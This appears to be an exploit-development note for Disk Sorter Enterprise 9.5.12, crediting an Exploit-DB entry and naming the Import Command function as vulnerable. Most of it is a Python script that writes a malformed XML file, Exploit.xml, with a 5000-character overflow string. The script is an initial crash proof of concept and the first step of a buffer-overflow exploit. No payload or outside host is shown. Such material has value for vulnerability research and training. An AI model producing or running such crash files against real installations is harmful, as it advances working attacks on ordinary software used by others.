# DiskSorterEnterprise_9.5.12
Downloaded from: https://www.exploit-db.com/exploits/41771

Vulnerable function: Command -> Import Command

## Initial Crash
```py
import os,struct

CRASH_LEN = 5000  # change me

payload = "A" * CRASH_LEN

#FILE
file='<?xml version="1.0" encoding="UTF-8"?>\n<classify\nname=\'' + payload + '\n</classify>'

f = open('Exploit.xml', 'w')
f.write(file)
f.close()
```
